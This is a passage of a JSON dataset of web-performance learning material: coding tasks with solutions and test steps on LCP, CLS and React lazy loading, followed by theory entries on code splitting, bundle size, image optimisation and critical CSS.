          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>LCP Optimization</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 0;\n            padding: 20px;\n            text-align: center;\n        }\n        .hero-section {\n            margin-top: 50px;\n        }\n        .hero-image {\n            width: 100%;\n            max-width: 800px;\n            height: auto;\n            display: block;\n            margin: 0 auto;\n        }\n    </style>\n    <!-- Solution: Preload the LCP image -->\n    <link rel=\"preload\" as=\"image\" href=\"https://picsum.photos/id/237/1200/800\">\n</head>\n<body>\n    <h1>Welcome to Our Awesome Page!</h1>\n    <p>This is some introductory text to our amazing content. The main image should load faster now!</p>\n    <div class=\"hero-section\">\n        <img src=\"https://picsum.photos/id/237/1200/800\" alt=\"Large Hero Image\" class=\"hero-image\">\n    </div>\n    <p>More content will appear below the image.</p>\n</body>\n</html>\n",
          "testCases": [
            "Open `index.html` in Chrome DevTools.",
            "Go to the 'Performance' tab, click record, and reload the page. Stop recording.",
            "Locate the 'LCP' marker in the timings. Note the time and the element.",
            "Apply the `link rel=\"preload\"` hint to the `<head>`.",
            "Repeat the performance recording.",
            "Compare the LCP times: the second run should show a significantly lower LCP time for the image.",
            "Explain that `preload` tells the browser to fetch the image with high priority earlier in the rendering process."
          ],
          "hints": [
            "Common LCP culprits include large images (especially hero images), large blocks of text, or large background images.",
            "To improve LCP for images, consider using `link rel=\"preload\"` in the `<head>`, optimizing image file size and format (e.g., WebP), or responsive images (`srcset`).",
            "Network throttling in DevTools (Network tab) can help simulate real-world conditions and make LCP issues more apparent.",
            "The `Performance` tab in DevTools will clearly highlight the LCP event and the element responsible for it."
          ],
          "tags": [
            "lcp",
            "performance",
            "optimization",
            "browser-dev-tools",
            "html",
            "images"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "html_basics",
            "browser_dev_tools",
            "web_performance_basics"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "lcp",
            "image_optimization",
            "preload"
          ]
        },
        {
          "id": "task_debug_and_fix_cls",
          "title": "Debug and Fix Cumulative Layout Shift (CLS) Issues",
          "description": "\nYou are presented with a web page that exhibits a noticeable layout shift (CLS) when an advertisement or image loads. Your task is to identify the cause of the CLS using browser developer tools and implement a solution to prevent the layout shift.\n\n**Requirements:**\n1.  **Identify CLS**: Load the provided `index.html`. Observe the page. Use Chrome DevTools (or similar) 'Performance' tab to record a page load and identify the layout shift events. Note the element causing the shift and the CLS score.\n2.  **Propose Solution**: Based on the identified cause, propose a method to prevent the layout shift.\n3.  **Implement Solution**: Modify the `index.html` or `style.css` to implement your solution.\n4.  **Verify Fix**: Re-run the performance analysis and confirm that the CLS score has significantly improved (ideally to 0) and the visual shift is gone.\n\n**Scenario**: A banner ad (simulated by a delayed image) loads and pushes existing content down.",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CLS Debugging</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 20px;\n            text-align: center;\n        }\n        .content-area {\n            border: 1px solid #ccc;\n            padding: 20px;\n            margin-bottom: 20px;\n        }\n        .ad-container {\n            width: 100%;\n            max-width: 728px;\n            margin: 20px auto;\n            background-color: #eee;\n            border: 1px dashed #999;\n            text-align: center;\n            line-height: 50px; /* Placeholder for ad */\n            color: #666;\n            font-style: italic;\n        }\n        /* Simulate a delayed ad image loading */\n        img.delayed-ad {\n            display: none; /* Hidden initially */\n            width: 728px; /* Intended width */\n            height: 90px; /* Intended height */\n        }\n    </style>\n</head>\n<body>\n    <h1>Website Content</h1>\n    <div class=\"content-area\">\n        <p>This is the main content of our page. It should ideally stay stable and not jump around.</p>\n        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>\n    </div>\n    \n    <div class=\"ad-container\" id=\"adSlot\">\n        Loading Ad...\n    </div>\n\n    <div class=\"content-area\">\n        <p>More content below the ad. This part often gets pushed down.</p>\n        <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\n    </div>\n\n    <script>\n        // Simulate an ad loading after a delay\n        setTimeout(() => {\n            const adSlot = document.getElementById('adSlot');\n            adSlot.innerHTML = `<img src=\"https://placehold.co/728x90/FF0000/FFFFFF?text=Awesome+Ad\" alt=\"Ad Banner\" class=\"delayed-ad\">`;\n            // Remove display:none and make it visible after some time to simulate dynamic loading.\n            const img = adSlot.querySelector('img');\n            if (img) {\n                img.style.display = 'block'; // Make it visible after content insertion\n                adSlot.style.lineHeight = 'initial'; // Remove placeholder line-height\n            }\n        }, 1500);\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CLS Debugging</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 20px;\n            text-align: center;\n        }\n        .content-area {\n            border: 1px solid #ccc;\n            padding: 20px;\n            margin-bottom: 20px;\n        }\n        .ad-container {\n            width: 100%;\n            max-width: 728px;\n            margin: 20px auto;\n            background-color: #eee;\n            border: 1px dashed #999;\n            text-align: center;\n            /* Solution: Reserve space for the ad */\n            min-height: 90px; /* Explicitly reserve height */\n            display: flex; /* To center content within the reserved space */\n            align-items: center;\n            justify-content: center;\n        }\n        img.delayed-ad {\n            width: 728px; /* Intended width */\n            height: 90px; /* Intended height */\n            display: none;\n        }\n    </style>\n</head>\n<body>\n    <h1>Website Content</h1>\n    <div class=\"content-area\">\n        <p>This is the main content of our page. It should ideally stay stable and not jump around.</p>\n        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>\n    </div>\n    \n    <div class=\"ad-container\" id=\"adSlot\">\n        Loading Ad...\n    </div>\n\n    <div class=\"content-area\">\n        <p>More content below the ad. This part often gets pushed down.</p>\n        <p>Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.</p>\n    </div>\n\n    <script>\n        setTimeout(() => {\n            const adSlot = document.getElementById('adSlot');\n            adSlot.innerHTML = `<img src=\"https://placehold.co/728x90/FF0000/FFFFFF?text=Awesome+Ad\" alt=\"Ad Banner\" class=\"delayed-ad\">`;\n            const img = adSlot.querySelector('img');\n            if (img) {\n                img.style.display = 'block';\n                // No need to adjust line-height if min-height is set on container\n            }\n        }, 1500);\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Open `index.html` in Chrome DevTools.",
            "Go to the 'Performance' tab, click record, and reload the page. Observe the ad loading and any layout shifts.",
            "In the 'Experience' section of the performance report, check the CLS score and identify the elements that shifted.",
            "Implement the solution (e.g., adding `min-height` to `.ad-container`).",
            "Re-run the performance recording and verify that the CLS score is now 0 or significantly reduced, and no visual shifts occur.",
            "Explain *why* the `min-height` property fixes the CLS issue for the ad container."
          ],
          "hints": [
            "CLS often occurs when dynamically injected content (like ads, images, or embeds) or fonts that load late don't have space reserved for them.",
            "The key to fixing CLS is to ensure that space is reserved for content that will eventually load or render.",
            "For images and iframes, always specify `width` and `height` attributes.",
            "For dynamic content containers, use CSS properties like `min-height` or aspect ratio boxes to reserve space.",
            "The 'Layout Shift' section in the Performance tab, or the 'Layout Shift Regions' checkbox in the Rendering tab (in DevTools) can help visualize shifts.",
            "Using `content-visibility: auto` (experimental) can also help, but `min-height` is a more widely supported fix for this specific case."
          ],
          "tags": [
            "cls",
            "performance",
            "layout-shift",
            "css",
            "html",
            "browser-dev-tools"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "html_css_basics",
            "browser_dev_tools"
          ],
          "complexity": 6,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "cls",
            "visual_stability",
            "web_performance_metrics"
          ]
        },
        {
          "id": "task_implement_react_lazy_suspense",
          "title": "Implement React.lazy and Suspense for a Collapsible Section",
          "description": "\nYou are building a React application that includes a large, complex component (e.g., a data table, a rich text editor) that is only visible when a user clicks a 'Show Details' button. To optimize the initial load time, you need to lazy-load this component using `React.lazy` and `Suspense`.\n\n**Requirements:**\n1.  **Create a Lazy Component**: Define `DetailedInfo` component in a separate file (`DetailedInfo.js`). This component should simulate heavy loading (e.g., `console.log` a message when rendered).\n2.  **Use React.lazy**: In `App.js`, use `React.lazy` to import `DetailedInfo`.\n3.  **Implement Toggle Logic**: Create a button that toggles the visibility of `DetailedInfo`.\n4.  **Add Suspense Boundary**: Wrap the `DetailedInfo` component with `Suspense` and provide a suitable `fallback` UI (e.g., 'Loading Details...').\n5.  **Verify**: Confirm that `DetailedInfo.js` is only loaded when the button is clicked, and the fallback UI appears during loading. (Check Network tab in DevTools for the chunk file).\n",
          "difficulty": "medium",
          "startingCode": "// App.js\nimport React, { useState } from 'react';\n// import DetailedInfo from './DetailedInfo'; // Don't import directly!\n\nfunction App() {\n  const [showDetails, setShowDetails] = useState(false);\n\n  const toggleDetails = () => {\n    setShowDetails(!showDetails);\n  };\n\n  return (\n    <div>\n      <h1>Main Application</h1>\n      <button onClick={toggleDetails}>\n        {showDetails ? 'Hide Details' : 'Show Details'}\n      </button>\n      \n      {/* TODO: Render DetailedInfo component using React.lazy and Suspense */}\n      {/* {showDetails && <DetailedInfo />} */}\n\n    </div>\n  );\n}\n\nexport default App;\n\n// DetailedInfo.js\nimport React from 'react';\n\nconst DetailedInfo = () => {\n  console.log('DetailedInfo component rendered!');\n  return (\n    <div style={{ border: '1px solid blue', padding: '20px', marginTop: '20px' }}>\n      <h2>Detailed Information</h2>\n      <p>This is a complex component with lots of data or heavy logic that should only load when needed.</p>\n      <ul>\n        <li>Item 1</li>\n        <li>Item 2</li>\n        <li>Item 3</li>\n      </ul>\n    </div>\n  );\n};\n\nexport default DetailedInfo;\n",
          "solutionCode": "// App.js\nimport React, { useState, Suspense, lazy } from 'react';\n\n// Use React.lazy for dynamic import\nconst DetailedInfo = lazy(() => import('./DetailedInfo'));\n\nfunction App() {\n  const [showDetails, setShowDetails] = useState(false);\n\n  const toggleDetails = () => {\n    setShowDetails(!showDetails);\n  };\n\n  return (\n    <div>\n      <h1>Main Application</h1>\n      <button onClick={toggleDetails}>\n        {showDetails ? 'Hide Details' : 'Show Details'}\n      </button>\n      \n      {showDetails && (\n        <Suspense fallback={<div>Loading Details...</div>}>\n          <DetailedInfo />\n        </Suspense>\n      )}\n    </div>\n  );\n}\n\nexport default App;\n\n// DetailedInfo.js\nimport React from 'react';\n\nconst DetailedInfo = () => {\n  console.log('DetailedInfo component rendered!');\n  return (\n    <div style={{ border: '1px solid blue', padding: '20px', marginTop: '20px' }}>\n      <h2>Detailed Information</h2>\n      <p>This is a complex component with lots of data or heavy logic that should only load when needed.</p>\n      <ul>\n        <li>Item 1</li>\n        <li>Item 2</li>\n        <li>Item 3</li>\n      </ul>\n    </div>\n  );\n};\n\nexport default DetailedInfo;\n",
          "testCases": [
            "Run the React application.",
            "Open DevTools (Network tab) and ensure 'JS' filter is active.",
            "Initially, observe that the `DetailedInfo.js` chunk is *not* loaded.",
            "Click the 'Show Details' button. Observe 'Loading Details...' briefly appearing.",
            "In the Network tab, verify that a new JavaScript chunk (representing `DetailedInfo.js`) is downloaded.",
            "Toggle the button multiple times: the chunk should only download once.",
            "Verify `DetailedInfo component rendered!` message appears in console only when the component is shown."
          ],
          "hints": [
            "Remember to import `Suspense` and `lazy` from `react`.",
            "The `lazy` function takes a function that returns a Promise, which resolves to a module with a default export.",
            "The `Suspense` component must wrap the lazy-loaded component and takes a `fallback` prop.",
            "To easily simulate a slight delay for better observation of the loading state, you could add a `setTimeout` inside the `import()` promise in `App.js` for testing purposes, but remove it for production.",
            "Ensure `DetailedInfo.js` has a `default export` for the component."
          ],
          "tags": [
            "react",
            "lazy-loading",
            "code-splitting",
            "suspense",
            "performance",
            "frontend-architecture"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_basics",
            "es6_modules",
            "promises"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "react.lazy",
            "suspense",
            "code_splitting"
          ]
        },
        {
          "id": "task_code_splitting_react_router",
          "title": "Implement Route-Based Code Splitting with React Router",
          "description": "\nEnhance a provided React application that uses `react-router-dom` by implementing route-based code splitting. The goal is to lazy-load specific route components to reduce the initial bundle size and improve load performance when navigating to those routes.\n\n**Requirements:**\n1.  **Define Route Components**: Create three simple components in separate files: `Home.js`, `About.js`, `Contact.js`.\n2.  **Lazy Load Components**: Use `React.lazy` to import `About` and `Contact` components in `App.js`.\n3.  **Integrate with React Router**: Set up `react-router-dom` routes in `App.js` for `/`, `/about`, and `/contact`.\n4.  **Add Suspense Boundary**: Wrap the `Routes` component with `Suspense` to provide a loading fallback.\n5.  **Verification**: Use browser DevTools (Network tab) to confirm that the `About.js` and `Contact.js` bundles are only loaded when their respective routes are accessed, not on initial page load.\n",
          "difficulty": "medium",
          "startingCode": "// App.js\nimport { BrowserRouter as Router, Route, Routes } from 'react-router-dom';\nimport React from 'react';\n// import Home from './components/Home';\n// import About from './components/About'; // TODO: Make lazy\n// import Contact from './components/Contact'; // TODO: Make lazy\n\nfunction App() {\n  return (\n    <Router>\n      <nav>\n        <a href=\"/\">Home</a> | <a href=\"/about\">About</a> | <a href=\"/contact\">Contact</a>\n      </nav>\n      {/* TODO: Add Suspense boundary for routes */}\n        <Routes>\n          <Route path=\"/\" element={<Home />} />\n          {/* TODO: Add lazy-loaded About and Contact routes */}\n          {/* <Route path=\"/about\" element={<About />} /> */}\n          {/* <Route path=\"/contact\" element={<Contact />} /> */}\n        </Routes>\n      {/* TODO: Close Suspense boundary */}\n    </Router>\n  );\n}\n\nexport default App;\n\n// components/Home.js\nimport React from 'react';\n\nconst Home = () => <h2>Home Page</h2>;\nexport default Home;\n\n// components/About.js\nimport React from 'react';\n\nconst About = () => {\n  console.log('About component loaded!');\n  return <h2>About Us</h2>;\n};\nexport default About;\n\n// components/Contact.js\nimport React from 'react';\n\nconst Contact = () => {\n  console.log('Contact component loaded!');\n  return <h2>Contact Page</h2>;\n};\nexport default Contact;\n",
          "solutionCode": "// App.js\nimport { BrowserRouter as Router, Route, Routes, Link } from 'react-router-dom';\nimport React, { Suspense, lazy } from 'react';\n\n// Home component can be eagerly loaded if it's the default landing page, or also lazy-loaded.\n// For this task, let's keep Home eagerly loaded for contrast.\nimport Home from './components/Home';\n\n// Lazy load About and Contact components\nconst About = lazy(() => import('./components/About'));\nconst Contact = lazy(() => import('./components/Contact'));\n\nfunction App() {\n  return (\n    <Router>\n      <nav>\n        <Link to=\"/\">Home</Link> | <Link to=\"/about\">About</Link> | <Link to=\"/contact\">Contact</Link>\n      </nav>\n      <Suspense fallback={<div>Loading page...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<Home />} />\n          <Route path=\"/about\" element={<About />} />\n          <Route path=\"/contact\" element={<Contact />} />\n        </Routes>\n      </Suspense>\n    </Router>\n  );\n}\n\nexport default App;\n\n// components/Home.js\nimport React from 'react';\n\nconst Home = () => <h2>Home Page</h2>;\nexport default Home;\n\n// components/About.js\nimport React from 'react';\n\nconst About = () => {\n  console.log('About component loaded!');\n  return <h2>About Us</h2>;\n};\nexport default About;\n\n// components/Contact.js\nimport React from 'react';\n\nconst Contact = () => {\n  console.log('Contact component loaded!');\n  return <h2>Contact Page</h2>;\n};\nexport default Contact;\n",
          "testCases": [
            "Run the React application.",
            "Open DevTools (Network tab) and filter for 'JS' files.",
            "On initial load (when `/` is active), confirm that `Home.js` (or its bundle) is loaded, but `About.js` and `Contact.js` chunks are NOT.",
            "Click the 'About' link. Observe a brief 'Loading page...' message, and then verify that the `About.js` chunk is loaded in the Network tab, and 'About component loaded!' is logged.",
            "Click the 'Contact' link. Observe similar behavior for `Contact.js`.",
            "Navigate back and forth: confirm chunks are only loaded once.",
            "Ensure navigation still works correctly after lazy-loading."
          ],
          "hints": [
            "Remember to import `Suspense` and `lazy` from `react`.",
            "For `react-router-dom` v6, use `Routes` and `element={<Component />}` for routes.",
            "The `Suspense` component should wrap the `Routes` component to handle loading states for any lazy-loaded route children.",
            "Use `<Link to=\"/path\">` from `react-router-dom` instead of `<a>` tags to prevent full page reloads, which would hide the lazy loading effect."
          ],
          "tags": [
            "react",
            "react-router",
            "code-splitting",
            "lazy-loading",
            "performance",
            "frontend-architecture"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_basics",
            "react_router_basics",
            "es6_modules",
            "promises"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "code_splitting",
            "react.lazy",
            "suspense",
            "react_router"
          ]
        }
      ]
    }
  },
  {
    "id": "ca0a4a2b-e6c2-490f-95bd-053e03016a43",
    "startLine": 12500,
    "endLine": 12599,
    "processedDate": "2025-06-17T12:56:10.111Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_react_code_splitting",
          "title": "React Code Splitting with React.lazy and Suspense",
          "content": "Code splitting is a technique that helps to reduce the bundle size of a web application, leading to faster initial page loads. Instead of loading all the JavaScript code at once, code splitting allows you to split your code into smaller 'chunks' that can be loaded on demand. This is particularly useful for large applications with many routes or features that might not be used immediately.\n\nReact provides built-in tools for code splitting: `React.lazy` and `Suspense`. \n\n## Key Concepts\n-   **React.lazy**: This function lets you render a dynamic import as a regular component. It automatically loads the bundle containing the `About` component when it's rendered for the first time. The `import()` syntax is a dynamic import, which means the module will be loaded on demand.\n-   **Suspense**: This component allows you to display a fallback UI (like a loading indicator) while the dynamic component is being loaded. If the component takes too long to load, or if there's a network error, `Suspense` will handle it. It can wrap multiple `lazy` components.\n-   **Integration with React Router**: `React.lazy` and `Suspense` work seamlessly with routing libraries like React Router. You wrap your route components that use `React.lazy` within a `Suspense` boundary, ensuring a loading state is shown while the route's component chunk is fetched.\n\n## Benefits\n-   **Faster Initial Load Times**: Users only download the code they need for the current view.\n-   **Improved User Experience**: Loading indicators prevent blank screens and provide feedback.\n-   **Better Resource Utilization**: Reduces the amount of data transferred over the network.\n-   **Better Cacheability**: Smaller, more specific chunks can be cached independently, improving subsequent loads.",
          "examples": [
            {
              "id": "example_react_code_splitting_1",
              "title": "Basic React.lazy and Suspense Usage with React Router",
              "code": "import React, { lazy, Suspense } from 'react';\nimport { BrowserRouter as Router, Route, Switch } from 'react-router-dom';\n\nconst Home = () => <div>Home Page</div>;\nconst About = lazy(() => import('./routes/About')); // Dynamically imported component\n\nconst App = () => (\n  <Router>\n    <Suspense fallback={<div>Loading...</div>}> {/* Fallback UI while 'About' loads */}\n      <Switch>\n        <Route exact path=\"/\" component={Home}/>\n        <Route path=\"/about\" component={About}/>\n      </Switch>\n    </Suspense>\n  </Router>\n);\n\nexport default App;",
              "explanation": "This example demonstrates how to use `React.lazy` to defer the loading of the `About` component until it's actually needed (i.e., when the `/about` route is accessed). The `Suspense` component provides a 'Loading...' message while the `About` component's bundle is being fetched over the network. This ensures that the initial bundle size for the application is smaller, as the `About` component's code is not included until it's requested.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_code_splitting_1",
            "question_react_code_splitting_2",
            "question_react_code_splitting_3",
            "question_react_code_splitting_4",
            "question_react_code_splitting_5"
          ],
          "relatedTasks": [
            "task_react_code_splitting_1"
          ],
          "tags": [
            "React",
            "Performance",
            "Code Splitting",
            "Lazy Loading",
            "Webpack",
            "Frontend Optimization"
          ],
          "technology": "React",
          "prerequisites": [
            "react_basics",
            "react_router"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "large_scale_react_apps",
            "performance_optimization"
          ]
        },
        {
          "id": "theory_bundle_size_optimization",
          "title": "Bundle Size Optimization: Tree Shaking, Minification, and Code Splitting",
          "content": "Optimizing the size of your JavaScript bundles is crucial for improving application performance, especially for users on slower networks or devices. Smaller bundles lead to faster download times, parsing, and execution. Key techniques include Tree Shaking, Minification, and more advanced Code Splitting configurations.\n\n## Key Concepts\n-   **Tree Shaking (Dead Code Elimination)**: This is a form of dead code elimination that removes unused JavaScript code from your final bundle. It relies on ES module `import` and `export` statements to detect which code is actually being used. Modern bundlers like Webpack and Rollup can perform tree shaking.\n    *   **How it works**: If you `import { functionA }` from a module, but never use `functionB` from that same module, tree shaking will remove `functionB` from the final bundle, provided `functionB` is side-effect free and correctly exported.\n    *   **Requirements**: Relies on static module structure (ESM) and a bundler configured for production mode (which often enables tree shaking by default).\n\n-   **Minification**: This process removes unnecessary characters (like whitespace, comments, and redundant semicolons) from code without changing its functionality. It also often renames variables and functions to shorter names (uglification) to further reduce file size. Tools like Terser (for JavaScript) and CSSNano (for CSS) are commonly used for minification.\n\n-   **Code Splitting (Webpack's `splitChunks`)**: While `React.lazy` provides component-level code splitting, Webpack's `splitChunks` optimization allows for more granular control over how chunks are created. It can automatically extract common dependencies (like vendor libraries) into separate chunks or split code based on specific criteria (e.g., node_modules, initial, async).\n    *   **`chunks: 'all'`**: A common configuration that tells Webpack to consider all chunks (sync and async) for optimization. This can lead to better sharing of modules between chunks, reducing overall bundle size and improving caching.\n\n## Benefits\n-   **Reduced Download Size**: Directly impacts initial load time.\n-   **Faster Parsing and Execution**: Smaller files are parsed and executed more quickly by the browser.\n-   **Improved Caching**: Smaller, more granular chunks can be cached independently, leading to better cache hit ratios on subsequent visits.",
          "examples": [
            {
              "id": "example_bundle_size_tree_shaking",
              "title": "Tree Shaking Example",
              "code": "// math.ts\nexport function sum(a: number, b: number): number {\n  return a + b;\n}\n\nexport function subtract(a: number, b: number): number {\n  return a - b;\n}\n\n// main.ts\nimport { sum } from './math'; // Only 'sum' is imported and used\n\nconsole.log(sum(2, 3)); // 'subtract' function will be removed by tree shaking in production build",
              "explanation": "In this example, only the `sum` function is imported and used from the `math` module. During a production build with a properly configured bundler like Webpack, the `subtract` function will be 'tree-shaken' (removed) from the final bundle because it's never referenced, thus reducing the bundle size.",
              "language": "typescript"
            },
            {
              "id": "example_bundle_size_webpack_config",
              "title": "Webpack Configuration for Bundle Optimization",
              "code": "const TerserPlugin = require('terser-webpack-plugin');\n\nmodule.exports = {\n  mode: 'production', // Enables production optimizations including tree shaking and minification\n  optimization: {\n    minimizer: [new TerserPlugin({ // Minifies JavaScript files\n      terserOptions: {\n        compress: {\n          drop_console: true, // Optional: Remove console.log statements\n        },\n      },\n    })],\n    splitChunks: {\n      chunks: 'all', // Optimize chunks for all types (initial, async)\n      minSize: 20000, // Minimum size of a chunk to be considered for splitting (in bytes)\n      maxInitialRequests: 3, // Maximum number of parallel requests on initial load\n      maxAsyncRequests: 5, // Maximum number of parallel requests for on-demand loading\n      cacheGroups: {\n        vendors: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name: 'vendors',\n          chunks: 'all',\n        },\n        // You can add custom cache groups here\n      },\n    },\n  },\n  // Other webpack configurations...\n};",
              "explanation": "This Webpack configuration snippet demonstrates how to enable production optimizations. `mode: 'production'` automatically enables tree shaking and other performance improvements. `TerserPlugin` is explicitly used for JavaScript minification. The `splitChunks` configuration with `chunks: 'all'` is crucial for automatically extracting shared code and vendor libraries into separate chunks, which can significantly improve caching and reduce the initial load size by allowing parallel downloads.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_bundle_size_1",
            "question_bundle_size_2",
            "question_bundle_size_3",
            "question_bundle_size_4",
            "question_bundle_size_5",
            "question_bundle_size_6"
          ],
          "relatedTasks": [
            "task_bundle_size_1"
          ],
          "tags": [
            "Webpack",
            "Bundle Optimization",
            "Performance",
            "JavaScript",
            "Build Tools",
            "Tree Shaking",
            "Minification",
            "Code Splitting"
          ],
          "technology": "Webpack",
          "prerequisites": [
            "javascript_modules",
            "webpack_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "performance_optimization",
            "large_scale_frontend_development"
          ]
        },
        {
          "id": "theory_image_optimization",
          "title": "Image Optimization Techniques",
          "content": "Images often constitute a significant portion of a webpage's total size, directly impacting load times and user experience. Optimizing images is a critical aspect of web performance. This involves serving appropriately sized images, using efficient formats, and employing lazy loading.\n\n## Key Concepts\n-   **Responsive Images (`srcset` and `sizes`)**: These HTML attributes allow browsers to choose the most appropriate image from a set based on the user's device characteristics (screen resolution, pixel density, viewport size).\n    *   `srcset`: Defines a list of image candidates along with their intrinsic widths (`1000w`) or pixel densities (`2x`).\n    *   `sizes`: Describes the intended display size of the image relative to the viewport. The browser uses this information, combined with `srcset`, to pick the best image. For example, `(max-width: 500px) 100vw` means 'if the viewport is up to 500px wide, the image will take up 100% of the viewport width'.\n    *   **Benefit**: Delivers smaller image files to devices that don't need larger ones, saving bandwidth and improving load times.\n\n-   **Lazy Loading (`loading='lazy'`)**: This attribute tells the browser to defer loading of images that are not immediately visible in the viewport (i.e., 'below the fold') until the user scrolls near them. This reduces the initial load time of the page and conserves system resources.\n    *   Native lazy loading is supported by most modern browsers.\n    *   **Benefit**: Improves initial page load performance, reduces bandwidth consumption for users who don't scroll down.\n\n-   **Modern Image Formats (`<picture>`, WebP/AVIF)**: Using modern image formats can drastically reduce file sizes while maintaining high visual quality. \n    *   **WebP**: A modern image format developed by Google that provides superior lossless and lossy compression for images on the web. It's often 25-35% smaller than JPEG or PNG for comparable quality.\n    *   **AVIF**: An even newer, highly efficient image format based on the AV1 video codec. It offers even better compression than WebP.\n    *   **`<picture>` element**: Allows you to provide multiple `source` elements with different image formats or media conditions. The browser will choose the first `source` it supports. This enables serving modern formats like WebP or AVIF to compatible browsers while providing a JPEG/PNG fallback for older browsers.\n\n## Additional Optimization Tips\n-   **Image Compression**: Compress images without significant loss of quality using tools like TinyPNG, ImageOptim, or build tools with image minification plugins.\n-   **CDN**: Use a Content Delivery Network to serve images from servers geographically closer to your users.\n-   **Vector Graphics (SVG)**: For icons and simple illustrations, use SVG as they are resolution-independent and typically very small in size.",
          "examples": [
            {
              "id": "example_image_optimization_responsive",
              "title": "Responsive Images with srcset and sizes",
              "code": "<!-- Responsive image example -->\n<img \n  src=\"small.jpg\" \n  srcset=\"medium.jpg 1000w, large.jpg 2000w\" \n  sizes=\"(max-width: 500px) 100vw, (max-width: 1000px) 50vw, 800px\" \n  alt=\"A beautiful landscape\"\n  loading=\"lazy\" <!-- Native lazy loading -->\n>",
              "explanation": "This `<img>` tag demonstrates responsive images. The `srcset` attribute provides two larger image versions (`medium.jpg` at 1000 pixels wide and `large.jpg` at 2000 pixels wide) in addition to the default `small.jpg`. The `sizes` attribute tells the browser how wide the image will be displayed at different viewport sizes: 100% of viewport width up to 500px, 50% of viewport width up to 1000px, and fixed 800px otherwise. The browser uses this information to pick the most appropriate image from `srcset`. `loading=\"lazy\"` ensures the image is only loaded when it enters or is about to enter the viewport.",
              "language": "html"
            },
            {
              "id": "example_image_optimization_modern_formats",
              "title": "Modern Image Formats with picture element",
              "code": "<!-- Modern image formats with fallback -->\n<picture>\n  <source type=\"image/webp\" srcset=\"image.webp\">\n  <source type=\"image/jpeg\" srcset=\"image.jpg\">\n  <img src=\"image.jpg\" alt=\"Optimized image\">\n</picture>",
              "explanation": "The `<picture>` element allows browsers to choose the optimal image format. It first tries to load `image.webp`. If the browser does not support WebP, it falls back to `image.jpg`. The `<img>` tag acts as a final fallback for browsers that don't support `<picture>` or any of the specified `source` types. This ensures broad compatibility while delivering smaller, more efficient `WebP` images to supporting browsers.",
              "language": "html"
            }
          ],
          "relatedQuestions": [
            "question_image_opt_1",
            "question_image_opt_2",
            "question_image_opt_3",
            "question_image_opt_4",
            "question_image_opt_5",
            "question_image_opt_6"
          ],
          "relatedTasks": [
            "task_image_optimization_1"
          ],
          "tags": [
            "Images",
            "Performance",
            "HTML",
            "Responsive Design",
            "Lazy Loading",
            "WebP",
            "Optimization"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_basics",
            "css_media_queries"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "web_performance_optimization",
            "responsive_web_design"
          ]
        },
        {
          "id": "theory_critical_css",
          "title": "Critical CSS Optimization",
          "content": "Critical CSS is the minimum amount of CSS required to render the 'above-the-fold' content of a webpage as quickly as possible. 'Above-the-fold' refers to the content visible to the user without scrolling. Optimizing critical CSS significantly improves the First Contentful Paint (FCP) and Largest Contentful Paint (LCP) metrics, as the browser can render meaningful content faster without waiting for all external stylesheets to download and parse.\n\n## Key Concepts\n-   **Inlining Critical CSS**: The essential CSS rules for the initial view are directly embedded within a `<style>` block in the `<head>` of the HTML document. This makes the CSS immediately available to the browser without an additional network request, allowing it to start rendering the visible content almost instantly.\n-   **Asynchronous Loading of Non-Critical CSS**: The rest of the CSS (for 'below-the-fold' content or less critical styles) is loaded asynchronously. This means it doesn't block the initial rendering of the page.\n    *   **`rel='preload'` and `as='style'`**: This tells the browser to fetch the stylesheet with a high priority but without blocking rendering. It's a hint for the browser to pre-fetch the resource.\n    *   **`onload='this.onload=null;this.rel='stylesheet''`**: After the stylesheet is loaded (signified by the `onload` event firing), its `rel` attribute is changed from `preload` to `stylesheet`. This activates the stylesheet, applying its styles to the document. The `this.onload=null` prevents the event from firing multiple times.\n    *   **`<noscript>` fallback**: Provides a fallback for browsers that do not support JavaScript or for users who have JavaScript disabled, 